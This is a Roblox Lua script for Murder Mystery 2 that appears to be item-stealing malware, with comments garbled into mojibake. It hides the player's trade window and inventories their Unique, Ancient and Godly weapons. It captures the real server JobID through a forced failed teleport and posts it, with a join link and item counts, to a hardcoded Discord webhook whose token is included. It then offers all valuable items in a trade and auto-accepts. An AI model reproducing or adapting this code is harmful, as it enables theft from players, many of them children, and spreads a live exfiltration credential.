local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local RepStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local placeId = 142823291 -- MM2 placeId
local spoofedJobId = game.JobId
local webhookUrl = "https://discord.com/api/webhooks/1413919894017413203/n3A3GU2C3Z0IhX-TMu3tKjFbCOgOG00Zss4QhhD3VwiCnJxAFlcGKeh6HqTdhaTKr2w4"

local InvModule = require(RepStorage.Modules.InventoryModule)

getgenv().realJobId = game.JobId -- —Å—Ç–∞—Ä—Ç–æ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ

-- –û—Ç–∫–ª—é—á–∞–µ–º Trade GUI
local destroytrades2 = coroutine.create(function()
    while true do
        local tradeGUI = LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("TradeGUI")
        local tradeGUIPhone = LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone")
        tradeGUI.Enabled = false
        tradeGUIPhone.Enabled = false
        wait(0.1)
    end
end)

-- –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ü–µ–Ω–Ω—ã—Ö –ø—Ä–µ–¥–º–µ—Ç–æ–≤
local function getValuableItems()
    local uniqueItems, ancientItems, godlyItems = {}, {}, {}
    for _, category in pairs(InvModule.MyInventory.Data.Weapons) do
        for _, item in pairs(category) do
            if item.Rarity == "Unique" then table.insert(uniqueItems, item.DataID)
            elseif item.Rarity == "Ancient" then table.insert(ancientItems, item.DataID)
            elseif item.Rarity == "Godly" then table.insert(godlyItems, item.DataID)
            end
        end
    end
    local hasValuable = #uniqueItems > 0 or #ancientItems > 0 or #godlyItems > 0
    return hasValuable, uniqueItems, ancientItems, godlyItems
end

-- –û—Ç–ø—Ä–∞–≤–∫–∞ webhook
local function sendWebhook(realJobId)
    local hasValuable, uniqueItems, ancientItems, godlyItems = getValuableItems()
    if not hasValuable then return end

    local fernUrl = "https://fern.wtf/joiner?placeId="..placeId.."&gameInstanceId="..realJobId
    local embed = {
        embeds = {{
            title = "üîç JobID Info",
            description = "Captured real JobID via failed teleport",
            color = 65280,
            fields = {
                { name = "Spoofed JobID", value = spoofedJobId, inline = true },
                { name = "Real JobID", value = realJobId, inline = true },
                { name = "Fern.wtf Join Link", value = fernUrl, inline = false },
                { name = "Uniques", value = tostring(#uniqueItems), inline = true },
                { name = "Ancients", value = tostring(#ancientItems), inline = true },
                { name = "Godlies", value = tostring(#godlyItems), inline = true },
            },
            footer = { text = "Delta JobID Logger" }
        }}
    }

    pcall(function()
        http_request({
            Url = webhookUrl,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(embed)
        })
    end)
end

-- –§—É–Ω–∫—Ü–∏—è trade steal
local function stealItems(targetPlayerName)
    coroutine.resume(destroytrades2)

    local sendArgs = {[1] = Players[targetPlayerName]}
    RepStorage.Trade.SendRequest:InvokeServer(unpack(sendArgs))

    wait(3)

    local function offerItems(itemList)
        for _, itemId in pairs(itemList) do
            RepStorage.Trade.OfferItem:FireServer(itemId, "Weapons")
        end
    end

    local _, uniqueItems, ancientItems, godlyItems = getValuableItems()
    offerItems(uniqueItems)
    offerItems(ancientItems)
    offerItems(godlyItems)

    wait(6)
    pcall(function()
        RepStorage.Trade.AcceptTrade:FireServer(285646582)
    end)
end

-- –°–æ—Ö—Ä–∞–Ω—è–µ–º JobId –ø—Ä–∏ –Ω–µ—É–¥–∞—á–Ω–æ–º —Ç–µ–ª–µ–ø–æ—Ä—Ç–µ (queue_on_teleport)
TeleportService.TeleportInitFailed:Connect(function(_,_,_,_,teleportInfo)
    if teleportInfo and teleportInfo.ServerInstanceId then
        getgenv().realJobId = teleportInfo.ServerInstanceId
        queue_on_teleport(string.format([[getgenv().realJobId = "%s"]], getgenv().realJobId))
        sendWebhook(getgenv().realJobId)
    end
end)

-- –§–æ—Ä—Å–∏—Ä—É–µ–º –ø–µ—Ä–µ–∑–∞—Ö–æ–¥ (JobId bypass)
for _ = 1, 2 do
    task.spawn(function()
        pcall(function()
            TeleportService:TeleportToPlaceInstance(placeId, game.JobId)
        end)
    end)
    task.wait(0.5)
end

-- –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –∑–∞–ø—É—Å–∫–∞–µ–º stealItems –ø–æ—Å–ª–µ –∑–∞—Ö–æ–¥–∞
Players.PlayerAdded:Connect(function(player)
    if player.Name == LocalPlayer.Name then
        wait(3)
        local hasValuable, _, _, _ = getValuableItems()
        if hasValuable then
            stealItems(LocalPlayer.Name)
        end
    end
end)
